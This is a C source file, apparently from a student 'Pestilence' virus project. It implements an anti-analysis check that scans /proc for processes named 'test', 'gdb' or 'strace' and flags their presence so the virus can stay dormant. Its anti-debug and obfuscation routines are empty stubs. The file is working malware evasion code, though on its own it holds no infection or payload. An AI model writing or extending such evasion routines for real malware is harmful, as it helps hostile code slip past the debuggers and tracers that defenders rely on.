#include "../incl/pestilence.h"

char    *ft_getproc(int i)
{
    if (i == 0)
        return ("test");
    else if (i == 1)
        return ("gdb");
    else
        return ("strace");
}

void    ft_antiprocess(t_pestilence *pestilence)
{
    char            path[1024];
    char            buff[1024];
    int             i = 0;
    int             fd;

    pestilence->proc = opendir("/proc");
    pestilence->readproc = readdir(pestilence->proc);
    while (i < 3)
    {
        rewinddir(pestilence->proc);
        while ((pestilence->readproc = readdir(pestilence->proc)) != NULL && pestilence->anti_virus == 0)
        {
            if (atoi(pestilence->readproc->d_name) > 0)
            {
                snprintf(path, sizeof(path), "/proc/%s/comm", pestilence->readproc->d_name);
                fd = open(path, O_RDONLY);
                if (fd == -1)
                    continue;
                read(fd, buff, sizeof(buff));
                close(fd);
                buff[strcspn(buff, "\n")] = 0;
                if (!strcmp(ft_getproc(i), buff))
                    pestilence->anti_virus = 1;
            }
        }
        i++;
    }
    closedir(pestilence->proc);
}

void    ft_antidebug(t_pestilence *pestilence)
{
    (void)pestilence;
} 

void    ft_obfuscation(t_pestilence *pestilence)
{
    (void)pestilence;
}